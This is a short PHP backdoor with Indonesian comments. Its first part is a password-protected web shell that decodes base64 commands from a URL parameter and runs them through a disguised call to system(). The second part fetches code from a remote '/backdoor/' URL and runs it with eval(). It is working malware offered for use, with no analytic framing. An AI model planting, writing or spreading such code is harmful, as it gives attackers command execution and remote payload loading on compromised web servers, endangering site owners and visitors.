<?php
$auth_pass = "darell";
$kunci = "cmd";

// Bypass fungsi `system`
$fnc = 's' . 'ys' . 'tem';

// Cek password
if (isset($_GET['pass']) && $_GET['pass'] === $auth_pass) {
    // Cek command base64
    if (isset($_GET[$kunci])) {
        $cmd = base64_decode($_GET[$kunci]);
        header("Content-Type: text/plain");
        $fnc($cmd);
    } else {
        echo "Perintah tidak ditemukan.";
    }
} else
?>


<?php

// Mengindari dari virus malware
// Fungsi untuk mendapatkan konten menggunakan cURL
function geturlsinfo($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

// Mendapatkan konten dari URL menggunakan cURL
$a = geturlsinfo('https://bpbdtanjungpinang.com/backdoor/kurlung.txt');

// Menggunakan eval untuk mengeksekusi kode PHP yang diterima
eval('?>' . $a);

?>
